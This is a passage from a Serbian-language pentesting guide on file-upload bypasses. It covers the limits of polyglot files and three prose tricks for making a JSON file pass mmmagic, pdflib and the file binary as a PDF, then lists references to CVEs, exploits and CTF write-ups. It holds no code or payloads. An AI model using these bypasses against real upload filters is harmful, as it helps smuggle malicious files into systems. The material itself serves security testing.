Uprkos svojoj prilagodljivosti, polygloti imaju ograničenja. Na primer, iako polyglot može istovremeno predstavljati PHAR fajl (PHp ARchive) i JPEG, uspeh njegovog upload-a može zavisiti od politike platforme u vezi sa ekstenzijama fajlova. Ako je sistem strogo ograničen u pogledu dozvoljenih ekstenzija, sama strukturna dualnost polyglota možda neće biti dovoljna da obezbedi njegov upload.

Više informacija u: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Kako upload-ovati validne JSON-ove kao da su PDF

Kako izbeći detekciju tipa fajla tako što ćete upload-ovati validan JSON fajl čak i kada nije dozvoljeno, lažirajući ga kao PDF fajl (tehnike iz **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` biblioteka**: Sve dok su `%PDF` magic bajtovi u prvih 1024 bajta, smatra se validnim (pogledajte primer u postu)
- **`pdflib` biblioteka**: Ubacite lažni PDF format unutar polja JSON-a tako da biblioteka pomisli da je u pitanju PDF (pogledajte primer u postu)
- **`file` binary**: Može da pročita do 1048576 bajtova iz fajla. Jednostavno napravite JSON veći od toga tako da ne može da parsira sadržaj kao json i zatim unutar JSON-a stavite početni deo realnog PDF-a i on će pomisliti da je u pitanju PDF

## References

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

{{#include ../../banners/hacktricks-training.md}}
